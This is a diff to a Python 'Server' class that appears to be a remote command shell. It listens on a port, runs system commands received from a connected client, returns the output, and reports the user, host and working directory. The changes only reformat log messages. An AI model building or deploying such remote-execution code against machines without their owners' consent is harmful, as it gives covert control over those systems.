@@ -17,9 +17,9 @@ class Server:
         server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         server.bind((self.ip, self.port))
         server.listen(0)
-        print(f'[+] Listening on port {self.port}...')
+        print(f'[+] {self.ip}:{self.port} Listening...')
         self.connection, self.address = server.accept()
-        print(f'[+] {self.address} connected.')
+        print(f'[+] {self.address[0]}:{self.address[1]} connected.')
 
     @staticmethod
     def execute_system_command(command):
@@ -82,7 +82,7 @@ class Server:
             try:
                 command = self.recv().split(' ')
                 if command[0] == 'exit':
-                    print(f'[-] {self.address} disconnected.')
+                    print(f'[-] {self.address[0]}:{self.address[1]} disconnected.')
                     self.__init__()
                 elif command[0] == 'info' and len(command) == 1:
                     self.send(f'{getpass.getuser()}@{socket.gethostname()}:{os.getcwd()}')
@@ -108,7 +108,7 @@ class Server:
                     command_result = self.execute_system_command(command)
                     self.send(command_result)
             except ConnectionResetError:
-                print(f'[-] {self.address} disconnected.')
+                print(f'[-] {self.address[0]}:{self.address[1]} disconnected.')
                 self.__init__()
             except Exception as e:
                 self.send(str(e))
